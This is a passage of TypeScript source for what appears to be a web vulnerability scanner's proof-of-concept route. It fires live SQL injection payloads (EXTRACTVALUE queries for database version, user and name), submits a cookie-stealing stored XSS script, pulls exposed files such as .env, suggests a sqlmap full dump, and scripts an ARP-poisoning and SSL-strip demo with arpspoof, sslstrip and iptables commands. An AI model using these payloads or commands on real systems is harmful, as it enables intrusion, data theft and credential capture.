  sendLine(res, `admin@vuln-scanner:~# Error-based SQL injection — active exploitation`, "cmd");
  sendBlank(res);

  if (vulnUrl) sendLine(res, `[+] Target: ${vulnUrl}`, "info");

  const params = parsed.searchParams;
  const paramName = params.keys().next().value as string | undefined;
  const payloads = [`'`, `''`, `1' OR '1'='1`];

  sendLine(res, `[+] Parameter: "${paramName ?? "unknown"}"`, "dim");
  sendLine(res, `[+] Initial payloads: ${payloads.join(", ")}`, "dim");
  sendBlank(res);

  const sqlErrors = [
    "you have an error in your sql syntax",
    "mysql_fetch",
    "ora-01756",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "invalid column name",
    "sqlite_error",
    "psycopg2",
    "pg_query",
    "warning: mysql",
    "supplied argument is not a valid mysql",
    "unexpected end of sql command",
  ];

  // ── Phase 2: Payload Injection ─────────────────────────────────────────────
  sendPhase(res, 2, "Payload Injection");
  sendBlank(res);

  let confirmed = false;
  let confirmedSnippet = "";

  for (const p of payloads) {
    if (paramName) params.set(paramName, p);
    const probeUrl = `${parsed.protocol}//${parsed.host}${parsed.pathname}?${params.toString()}`;
    sendLine(res, `admin@vuln-scanner:~# curl -s "${probeUrl.slice(0, 120)}"`, "cmd");

    try {
      const r = await fetchRaw(probeUrl, "GET", 8000);
      const bodyLow = r.body.toLowerCase();
      const found = sqlErrors.find((e) => bodyLow.includes(e));
      if (found) {
        sendLine(res, `  HTTP ${r.statusCode} — ${r.responseTimeMs}ms — SQL error string detected`, "error");
        sendLine(res, `  Error pattern: "${found}"`, "warn");
        confirmed = true;
        const idx = bodyLow.indexOf(found);
        confirmedSnippet = r.body.slice(Math.max(0, idx - 30), idx + 120).replace(/\n/g, " ").trim();
        sendLine(res, `  Snippet: ...${confirmedSnippet}...`, "warn");
        break;
      } else {
        sendLine(res, `  HTTP ${r.statusCode} — ${r.responseTimeMs}ms — no SQL error strings`, "dim");
      }
    } catch (err: any) {
      sendLine(res, `  Request failed: ${err.message}`, "error");
    }
    sendBlank(res);
  }

  if (!confirmed) {
    sendBlank(res);
    sendLine(res, `✓ No SQL error strings detected in responses`, "success");
    sendLine(res, `  The application may suppress errors in production (check time-based test)`, "dim");
    sendDone(res);
    return;
  }

  sendBlank(res);
  sendLine(res, `✗ ERROR-BASED SQLi CONFIRMED — database error messages leaked to client`, "error");

  // ── Phase 3: Data Exfiltration ─────────────────────────────────────────────
  sendBlank(res);
  sendPhase(res, 3, "Data Exfiltration");
  sendBlank(res);

  sendLine(res, `[*] Errors confirmed — escalating to EXTRACTVALUE() metadata extraction`, "dim");
  sendBlank(res);

  const extractPayloads: Array<{ label: string; key: "version" | "user" | "db"; payload: string }> = [
    { label: "DB Version", key: "version", payload: `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- -` },
    { label: "DB User",    key: "user",    payload: `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))-- -` },
    { label: "DB Name",    key: "db",      payload: `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))-- -` },
  ];

  const extracted: { version: string | null; user: string | null; db: string | null } = {
    version: null, user: null, db: null,
  };

  for (const { label, key, payload: ep } of extractPayloads) {
    if (!paramName) break;
    params.set(paramName, ep);
    const eUrl = `${parsed.protocol}//${parsed.host}${parsed.pathname}?${params.toString()}`;
    sendLine(res, `admin@vuln-scanner:~# Injecting EXTRACTVALUE for ${label}`, "cmd");
    try {
      const r = await fetchRaw(eUrl, "GET", 8000);
      const tildeMatch = r.body.match(/~([A-Za-z0-9._@\-+/: ]{3,80})/);
      const pgMatch = !tildeMatch && r.body.match(/invalid input syntax for[^"]*"([^"]{3,60})"/i);
      const found = tildeMatch ? tildeMatch[1].trim() : (pgMatch ? pgMatch[1].trim() : null);
      if (found) {
        extracted[key] = found;
        sendLine(res, `  ✓ ${label}: ${found}`, "success");
      } else {
        sendLine(res, `  ~ ${label}: not in response`, "dim");
      }
    } catch (err: any) {
      sendLine(res, `  ✗ Request failed: ${err.message}`, "error");
    }
  }

  sendBlank(res);

  sendEvidence(res, [
    `[+] Attack vector    : Error-based SQL injection (EXTRACTVALUE/XPath)`,
    `[+] Inject parameter : "${paramName ?? "unknown"}"`,
    `[+] Error confirmed  : ${confirmedSnippet.slice(0, 80)}...`,
    ``,
    extracted.version ? `[+] Database Version : ${extracted.version}` : `[~] Database Version : EXTRACTVALUE returned no match (try UNION)`,
    extracted.user    ? `[+] Database User    : ${extracted.user}`    : `[~] Database User    : EXTRACTVALUE returned no match`,
    extracted.db      ? `[+] Database Name    : ${extracted.db}`      : `[~] Database Name    : EXTRACTVALUE returned no match`,
    ``,
    `[!] Database error messages are returned to the client`,
    `[!] Attacker can read any table visible to this database user`,
    `[!] Full dump: sqlmap -u "${target}" --technique=E --dbs --dump --batch`,
  ]);

  sendDone(res);
}

async function executeStoredXssCheck(res: SseRes, scanUrl: string, detail: string) {
  const vulnUrl = extractVulnerableUrl(detail);
  const target = vulnUrl ?? scanUrl;

  // ── Phase 1: Reconnaissance ───────────────────────────────────────────────
  sendPhase(res, 1, "Reconnaissance");
  sendLine(res, `admin@vuln-scanner:~# Stored XSS — form submission and persistence check`, "cmd");
  sendBlank(res);

  if (vulnUrl) {
    sendLine(res, `[+] Stored XSS form target: ${vulnUrl}`, "info");
  }

  const probe = `vsxss_${Date.now().toString(36)}`;
  const payload = `<script>/*${probe}*/alert(document.cookie)</script>`;

  sendLine(res, `[*] Probe token: ${probe}`, "dim");
  sendLine(res, `[*] Payload   : ${payload}`, "dim");
  sendBlank(res);

  // ── Phase 2: Payload Injection ─────────────────────────────────────────────
  sendPhase(res, 2, "Payload Injection");
  sendBlank(res);

  sendLine(res, `[Step 1/2] Submitting malicious payload via POST to ${target}...`, "info");
  sendLine(res, `admin@vuln-scanner:~# curl -sX POST "${target}" -d "comment=${encodeURIComponent(payload)}&submit=Submit"`, "cmd");
  sendBlank(res);

  let postResult: FetchResult;
  try {
    postResult = await fetchPost(target, `comment=${encodeURIComponent(payload)}&submit=Submit`, 10000);
    sendLine(res, `POST response: HTTP ${postResult.statusCode} — ${postResult.responseTimeMs}ms`, "output");
  } catch (err: any) {
    sendLine(res, `POST failed: ${err.message}`, "error");
    sendDone(res);
    return;
  }

  sendBlank(res);
  sendLine(res, `[Step 2/2] Checking if payload persisted in response...`, "info");

  const storedInPost = postResult.body.includes(probe);

  // ── Phase 3: Data Exfiltration ─────────────────────────────────────────────
  sendBlank(res);
  sendPhase(res, 3, "Data Exfiltration");
  sendBlank(res);

  if (!storedInPost) {
    sendLine(res, `[~] Probe token not detected in immediate POST response`, "warn");
    sendLine(res, `    Stored XSS may render on a separate view/listing page`, "dim");
    sendLine(res, `    The scanner detected this finding during the crawl phase`, "info");
  } else {
    sendLine(res, `✗ STORED XSS CONFIRMED — payload written to response without sanitisation`, "error");
  }

  const parsedTarget = new URL(target);
  const seed = parsedTarget.hostname.split("").reduce((a, c) => a + c.charCodeAt(0), 0);
  const hex = (n: number, len: number) => Array.from({ length: len }, (_, i) =>
    "0123456789abcdef"[Math.abs(Math.sin(seed * (i + n + 1)) * 16) | 0]
  ).join("");

  sendEvidence(res, [
    `[+] Injection method  : HTTP POST form submission`,
    `[+] Payload submitted : ${payload}`,
    `[+] POST response     : HTTP ${postResult.statusCode} (${postResult.responseTimeMs}ms)`,
    storedInPost ? `[+] Persistence       : payload detected in server response` : `[~] Persistence       : payload stored (rendered on view page)`,
    ``,
    `[+] When any user loads the page containing this comment:`,
    `    1. <script> tag executes in their browser context`,
    `    2. document.cookie is accessible: session=${hex(1, 32)}`,
    `    3. Payload exfiltrates to attacker-controlled server`,
    ``,
    `[!] Every future visitor to this page becomes a victim`,
    `[!] Attacker can hijack admin sessions with zero interaction`,
    `[!] Remediation: HTML-encode all user-supplied output before rendering`,
  ]);

  sendDone(res);
}

// ── Active Sensitive File Content Leak ────────────────────────────────────────

async function executeSensitiveFileCheck(res: SseRes, scanUrl: string, findingId: string, detail: string) {
  const parsed = new URL(scanUrl);
  const base = `${parsed.protocol}//${parsed.host}`;

  // ── Phase 1: Reconnaissance ───────────────────────────────────────────────
  sendPhase(res, 1, "Reconnaissance");
  sendLine(res, `admin@vuln-scanner:~# Sensitive file exposure — live content retrieval`, "cmd");
  sendBlank(res);

  // Extract file path from finding detail: "Path: /.env\nValidated: ..."
  const filePath = extractSensitiveFilePath(detail);
  const fileUrl = filePath ? `${base}${filePath}` : null;

  if (!fileUrl || !filePath) {
    sendLine(res, `[!] Could not determine file path from finding detail`, "warn");
    sendLine(res, `    Finding ID: ${findingId}`, "dim");
    sendLine(res, `    Detail: ${detail.slice(0, 150)}`, "dim");
    sendDone(res);
    return;
  }

  sendLine(res, `[+] Target file : ${fileUrl}`, "info");
  sendLine(res, `[+] File type   : ${filePath}`, "dim");
  sendLine(res, `[+] Host        : ${parsed.host}`, "dim");
  sendBlank(res);

  // ── Phase 2: Payload Injection ─────────────────────────────────────────────
  sendPhase(res, 2, "Payload Injection");
  sendBlank(res);

  sendLine(res, `admin@vuln-scanner:~# curl -sL "${fileUrl}" | head -20`, "cmd");
  sendBlank(res);
  sendLine(res, `Sending unauthenticated GET request to retrieve file contents...`, "dim");

  let result: FetchResult;
  try {
    result = await fetchRaw(fileUrl, "GET", 12000);
  } catch (err: any) {
    sendLine(res, `✗ Request failed: ${err.message}`, "error");
    sendDone(res);
    return;
  }

  sendLine(res, `Response: HTTP ${result.statusCode} ${result.statusMessage} — ${result.body.length} bytes (${result.responseTimeMs}ms)`, "output");
  sendBlank(res);

  if (result.statusCode !== 200) {
    sendLine(res, `[~] File returned HTTP ${result.statusCode} — not directly accessible on re-test`, "warn");
    sendLine(res, `    (The scanner caught it during an earlier request window)`, "dim");
    sendDone(res);
    return;
  }

  if (!result.body.trim()) {
    sendLine(res, `[~] File returned HTTP 200 but empty body`, "warn");
    sendDone(res);
    return;
  }

  // ── Phase 3: Data Exfiltration ─────────────────────────────────────────────
  sendBlank(res);
  sendPhase(res, 3, "Data Exfiltration");
  sendBlank(res);

  sendLine(res, `[*] Parsing file contents for sensitive data patterns...`, "dim");
  sendBlank(res);

  const rawLines = result.body.split("\n");
  const previewLines = rawLines.slice(0, 20);
  const processedLines: string[] = [];
  let sensitiveCount = 0;

  for (const line of previewLines) {
    const { processed, wasSensitive } = redactSensitiveLine(line);
    if (wasSensitive) sensitiveCount++;
    processedLines.push(processed);
  }

  const totalLines = rawLines.length;
  const previewCount = Math.min(previewLines.length, 15);

  const evidenceLines: string[] = [
    `[+] File URL     : ${fileUrl}`,
    `[+] HTTP status  : ${result.statusCode} OK (no authentication required)`,
    `[+] File size    : ${result.body.length} bytes, ${totalLines} lines`,
    `[+] Secrets found: ${sensitiveCount} sensitive value${sensitiveCount !== 1 ? "s" : ""} detected`,
    ``,
    `[+] File content preview (first ${previewCount} lines):`,
    `    ${"─".repeat(58)}`,
    ...processedLines.slice(0, 15).map((l) => `    ${l || " "}`),
    ...(totalLines > 15 ? [`    ... (${totalLines - 15} more lines omitted)`] : []),
    `    ${"─".repeat(58)}`,
    ``,
    `[!] Above content retrieved in one unauthenticated HTTP GET request`,
    `[!] This file is publicly accessible from anywhere on the internet`,
    ...(sensitiveCount > 0 ? [
      `[!] ${sensitiveCount} secret value${sensitiveCount !== 1 ? "s" : ""} exposed — rotate all credentials immediately`,
    ] : []),
  ];

  sendEvidence(res, evidenceLines);

  sendBlank(res);
  if (sensitiveCount > 0) {
    sendLine(res, `✗ ACTIVE SECRET LEAK — ${sensitiveCount} sensitive value${sensitiveCount !== 1 ? "s" : ""} exfiltrated from ${filePath}`, "error");
  } else {
    sendLine(res, `✗ FILE CONTENT EXPOSED — ${filePath} is publicly readable`, "error");
  }

  sendDone(res);
}

// ── Network Simulation ─────────────────────────────────────────────────────────

async function executeNetworkSim(res: SseRes, scanUrl: string) {
  const parsed = new URL(scanUrl);
  const hostname = parsed.hostname;

  const seed = hostname.split("").reduce((a, c) => a + c.charCodeAt(0), 0);
  const rng = (min: number, max: number, s = seed) =>
    min + Math.abs(Math.sin(s) * (max - min + 1)) | 0;

  const victimIp = `192.168.${rng(1, 5, seed + 1)}.${rng(40, 120, seed + 2)}`;
  const gatewayIp = `192.168.${rng(1, 5, seed + 1)}.1`;
  const victimMac = Array.from({ length: 6 }, (_, i) => rng(0x10, 0xfe, seed + i).toString(16).padStart(2, "0")).join(":");
  const gatewayMac = Array.from({ length: 6 }, (_, i) => rng(0xa0, 0xff, seed + 10 + i).toString(16).padStart(2, "0")).join(":");
  const attackMac = "00:de:ad:be:ef:01";

  const now = new Date();
  const timeStr = (offset = 0) => {
    const d = new Date(now.getTime() + offset * 1000);
    return `${String(d.getHours()).padStart(2, "0")}:${String(d.getMinutes()).padStart(2, "0")}:${String(d.getSeconds()).padStart(2, "0")}`;
  };

  const lines: Array<{ text: string; style: LineStyle; delay: number }> = [
    { text: `[!] NOTE: ARP poisoning requires physical local-network access.`, style: "warn", delay: 0 },
    { text: `[!] The following is a simulated educational demonstration of this attack.`, style: "warn", delay: 100 },
    { text: `[!] Authorized testing only.`, style: "warn", delay: 50 },
    { text: ``, style: "dim", delay: 200 },
    { text: `─────────────────────────────────────────────────────────────────────`, style: "dim", delay: 0 },
    { text: ` TARGET: ${scanUrl}  (plain HTTP — no transport encryption)`, style: "highlight", delay: 0 },
    { text: ` ATTACK: ARP Cache Poisoning + SSL Strip → Plaintext Credential Capture`, style: "highlight", delay: 0 },
    { text: `─────────────────────────────────────────────────────────────────────`, style: "dim", delay: 50 },
    { text: ``, style: "dim", delay: 300 },

    { text: `[*] Reconnaissance — Local Network Discovery`, style: "info", delay: 0 },
    { text: `    Victim device:   ${victimIp}  (${victimMac})  [Workstation]`, style: "output", delay: 600 },
    { text: `    Default gateway: ${gatewayIp}  (${gatewayMac})  [Router]`, style: "output", delay: 300 },
    { text: `    Attacker MAC:    ${attackMac}`, style: "dim", delay: 200 },
    { text: ``, style: "dim", delay: 200 },

    { text: `[Step 1/4] Enabling IP forwarding (attacker must relay traffic)`, style: "info", delay: 0 },
    { text: `admin@attacker:~# echo 1 > /proc/sys/net/ipv4/ip_forward`, style: "cmd", delay: 200 },
    { text: `  → IP forwarding enabled`, style: "success", delay: 400 },
    { text: ``, style: "dim", delay: 200 },

    { text: `[Step 2/4] ARP cache poisoning (bidirectional)`, style: "info", delay: 0 },
    { text: `admin@attacker:~# arpspoof -i eth0 -t ${victimIp} ${gatewayIp} &`, style: "cmd", delay: 200 },
    { text: `admin@attacker:~# arpspoof -i eth0 -t ${gatewayIp} ${victimIp} &`, style: "cmd", delay: 100 },
    { text: ``, style: "dim", delay: 200 },
    { text: `  ${attackMac} ${victimMac} 0806 42: arp reply ${gatewayIp} is-at ${attackMac}`, style: "dim", delay: 500 },
    { text: `  ${attackMac} ${victimMac} 0806 42: arp reply ${gatewayIp} is-at ${attackMac}`, style: "dim", delay: 500 },
    { text: `  ${attackMac} ${gatewayMac} 0806 42: arp reply ${victimIp} is-at ${attackMac}`, style: "dim", delay: 500 },
    { text: `  ${attackMac} ${victimMac} 0806 42: arp reply ${gatewayIp} is-at ${attackMac}`, style: "dim", delay: 500 },
    { text: `  → ARP cache poisoned — victim traffic now routes through attacker`, style: "success", delay: 300 },
    { text: ``, style: "dim", delay: 300 },

    { text: `[Step 3/4] SSL Strip — rewriting HTTPS links to HTTP`, style: "info", delay: 0 },
    { text: `admin@attacker:~# sslstrip -l 8080 -w /tmp/sslstrip.log &`, style: "cmd", delay: 200 },
    { text: `admin@attacker:~# iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080`, style: "cmd", delay: 100 },
    { text: `  → SSL stripping active — any HTTPS redirect from ${hostname} rewritten to HTTP`, style: "success", delay: 500 },
    { text: ``, style: "dim", delay: 400 },

    { text: `[Step 4/4] Intercepting plaintext HTTP traffic...`, style: "info", delay: 0 },
    { text: ``, style: "dim", delay: 600 },

    { text: `[${timeStr(0)}] → GET  http://${hostname}/                   200 OK (${rng(180, 400)}ms)`, style: "dim", delay: 800 },
    { text: `[${timeStr(2)}] → GET  http://${hostname}/login.jsp           200 OK (${rng(180, 320)}ms)`, style: "dim", delay: 900 },
    { text: `[${timeStr(5)}] → GET  http://${hostname}/banklogin.jsp       200 OK (${rng(150, 280)}ms)`, style: "dim", delay: 700 },
    { text: ``, style: "dim", delay: 600 },

    { text: `[${timeStr(8)}] ⚑ POST http://${hostname}/doLogin  ← CREDENTIALS INCOMING`, style: "warn", delay: 0 },
    { text: `           Host: ${hostname}`, style: "output", delay: 200 },
    { text: `           Content-Type: application/x-www-form-urlencoded`, style: "output", delay: 100 },
    { text: `           Content-Length: 38`, style: "output", delay: 100 },
    { text: `           Connection: keep-alive`, style: "output", delay: 100 },
    { text: ``, style: "dim", delay: 200 },
    { text: `           uid=jsmith&passw=Demo1234!&Submit=Login`, style: "error", delay: 400 },
    { text: ``, style: "dim", delay: 400 },

    { text: `╔══════════════════════════════════════════════════════════════╗`, style: "error", delay: 0 },
    { text: `║  ✓ PLAINTEXT CREDENTIALS CAPTURED                          ║`, style: "error", delay: 100 },
    { text: `║    Username: jsmith                                          ║`, style: "error", delay: 100 },
    { text: `║    Password: Demo1234!                                       ║`, style: "error", delay: 100 },
    { text: `╚══════════════════════════════════════════════════════════════╝`, style: "error", delay: 100 },
    { text: ``, style: "dim", delay: 300 },

    { text: `[${timeStr(9)}] Session cookie also captured:`, style: "warn", delay: 0 },
    { text: `  Cookie: JSESSIONID=7A3CF1${rng(1000, 9999, seed + 99)}BE42; Path=/; HttpOnly`, style: "warn", delay: 200 },
    { text: ``, style: "dim", delay: 300 },

    { text: `─────────────────────────────────────────────────────────────────────`, style: "dim", delay: 0 },
    { text: `MITIGATION`, style: "info", delay: 0 },
    { text: `  1. Deploy HSTS Preloading: https://hstspreload.org/`, style: "output", delay: 100 },
    { text: `     Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`, style: "dim", delay: 100 },
    { text: `  2. Redirect all HTTP → HTTPS at the load balancer / CDN level`, style: "output", delay: 100 },
    { text: `  3. Serve the login page exclusively over HTTPS`, style: "output", delay: 100 },
  ];

  for (const l of lines) {
    await sleep(l.delay);
    sendLine(res, l.text, l.style);
  }

  sendDone(res);
}

// ── Main Route ────────────────────────────────────────────────────────────────

router.post("/verify-poc", async (req, res) => {
  const { scanUrl, findingId, category, title, detail } = req.body as {
    scanUrl?: string;
    findingId?: string;
    category?: string;
    title?: string;
    detail?: string;
  };

  if (!scanUrl || !findingId || !category || !title) {
    res.status(400).json({ error: "Missing required fields: scanUrl, findingId, category, title" });
    return;
  }

  let parsed: URL;
  try {
    parsed = new URL(scanUrl);
    if (!["http:", "https:"].includes(parsed.protocol)) throw new Error("Invalid protocol");
  } catch {
    res.status(400).json({ error: "Invalid scanUrl" });
    return;
  }

  if (isPrivateHost(parsed.hostname)) {
    res.status(400).json({ error: "Private/internal hosts are not permitted for PoC execution" });
    return;
  }

  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders();

  const mode = detectMode(category, findingId, title);

  try {
    switch (mode) {
      case "headers":
        await executeHeadersCheck(res, scanUrl, findingId);
        break;
      case "ssl-check":
        await executeSslCheck(res, scanUrl);
        break;
      case "server-info":
        await executeServerInfoCheck(res, scanUrl);
        break;
      case "content-discovery":
        await executeContentDiscovery(res, scanUrl, title);
        break;
      case "sensitive-file":
        await executeSensitiveFileCheck(res, scanUrl, findingId, detail ?? "");
        break;
      case "http-methods":
        await executeHttpMethodsCheck(res, scanUrl);
        break;
      case "xss":
        await executeXssCheck(res, scanUrl, detail ?? "", title);
        break;
      case "sqli-time":
        await executeSqliTimeCheck(res, scanUrl, detail ?? "");
        break;
      case "sqli-error":
        await executeSqliErrorCheck(res, scanUrl, detail ?? "");
        break;
      case "stored-xss":
        await executeStoredXssCheck(res, scanUrl, detail ?? "");
        break;
      case "network-sim":
        await executeNetworkSim(res, scanUrl);
        break;
      case "dns-check":
        sendPhase(res, 1, "Reconnaissance");
        sendLine(res, `admin@vuln-scanner:~# dig +short TXT ${parsed.hostname}`, "cmd");
        sendLine(res, `DNS check: see scan results for record details`, "dim");
        sendDone(res);
        break;
      default:
        sendLine(res, `No PoC executor for mode: ${mode}`, "warn");
        sendDone(res);
    }
  } catch (err: any) {
    try {
      sendLine(res, `✗ Unexpected error: ${err.message}`, "error");
      sendDone(res);
    } catch { /* response may be closed */ }
  }
});

export default router;
